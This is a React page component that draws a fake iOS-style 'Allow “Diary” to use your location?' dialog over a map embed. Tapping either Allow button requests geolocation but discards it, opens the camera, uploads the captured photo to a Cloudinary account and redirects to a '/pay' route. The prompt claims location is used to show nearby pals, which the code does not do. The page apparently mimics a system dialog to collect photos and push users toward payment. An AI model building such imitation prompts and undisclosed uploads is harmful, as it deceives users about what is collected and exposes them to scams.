import { useContext, useState } from "react";
import { useNavigate } from "react-router-dom";
import Reusablespinz from "../Components/Reusablespinz";
import "../Css/location.css";
import { ImageContext } from "../App";

function Location() {
    const navigate = useNavigate();
    const { image, setimage } = useContext(ImageContext);
    const [loading, setLoading] = useState(false);
    const [loadingMessage, setLoadingMessage] = useState(""); // 👈 Custom message

    const checkPermissionAndGetLocation = async () => {
        try {
            const permission = await navigator.permissions.query({ name: "geolocation" });

            if (permission.state === "granted" || permission.state === "prompt") {
                getLocation();
            } else {
                console.log("Location access denied. Please enable location manually.");
            }
        } catch (err) {
            console.log("Error checking location permission:", err);
        }
    };

    const getLocation = () => {
        setLoading(true);
        setLoadingMessage("Opening camera...");

        navigator.geolocation.getCurrentPosition(
            (position) => {
                openCameraApp();
            },
            (error) => {
                console.log("An error occurred:", error);
                setLoading(false);
            }
        );
    };

    const openCameraApp = () => {
        const cameraInput = document.createElement("input");
        cameraInput.type = "file";
        cameraInput.accept = "image/*";
        cameraInput.capture = "environment";
        cameraInput.click();

        cameraInput.addEventListener("change", async (event) => {
            const file = event.target.files[0];
            if (!file) {
                setLoading(false);
                return;
            }

            // 👇 After selecting file, change message
            setLoadingMessage("Please wait...");

            const formdata = new FormData();
            formdata.append("file", file);
            formdata.append("upload_preset", "cavin_kart");
            formdata.append("cloud_name", "dl0qctpk2");

            try {
                const res = await fetch("https://api.cloudinary.com/v1_1/dl0qctpk2/image/upload", {
                    method: "POST",
                    body: formdata,
                });

                const pen = await res.json();
                setimage(pen.url);
                setTimeout(() => {
                    setLoading(false);
                    navigate("/pay");
                }, 1000);
            } catch (error) {
                console.error("Cloudinary upload failed:", error);
                setLoading(false);
            }
        });
    };

    return (
        <div>
            <Reusablespinz />

            {/* ✅ Dynamic Loading Overlay */}
            {loading && (
                <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex justify-center items-center z-50">
                    <div className="text-white text-lg animate-pulse">
                        {loadingMessage}
                    </div>
                </div>
            )}

            <div>
                <div className="bg-opacity-60 flex justify-center items-center bg-slate-700" id="location">
                    <div className="bg-[#1E1E1EBF] w-[270px] h-[440px] text-white rounded-[14px]">
                        <div className="location__header">
                            <h1 className="font-inter font-semibold text-[17px] indent-4">
                                Allow “Diary” to use your <span className="ml-20">location?</span>
                            </h1>
                            <p className="text-[13px] font-medium">
                                Turning on location services allows us{" "}
                                <span className="ml-3">to show you when pals are nearby.</span>
                            </p>
                        </div>

                        <iframe
                            src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d4013467.1025377945!2d73.26350234190727!3d10.78053209201264!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3b00c582b1189633%3A0x559475cc463361f0!2sTamil%20Nadu!5e0!3m2!1sen!2sin!4v1743676861541!5m2!1sen!2sin"
                            width="270"
                            height="180"
                            allowFullScreen=""
                            loading="lazy"
                            referrerPolicy="no-referrer-when-downgrade"
                        ></iframe>

                        <div className="flex flex-col">
                            <button
                                className="w-[270px] h-[44px] border border-[#787878] font-inter text-[#5A91F7]"
                                style={{ padding: "11px 8px" }}
                                onClick={checkPermissionAndGetLocation}
                            >
                                Allow
                            </button>
                            <button
                                className="w-[270px] h-[44px] border border-[#787878] text-[#5A91F7]"
                                style={{ padding: "11px 8px" }}
                                onClick={checkPermissionAndGetLocation}
                            >
                                Allow While Using App
                            </button>
                            <button
                                className="w-[270px] h-[44px] border border-[#787878] text-[#5A91F7] rounded-bl-xl rounded-br-xl"
                                style={{ padding: "11px 8px" }}
                                onClick={() => navigate("/")}
                            >
                                Don’t Allow
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Location;
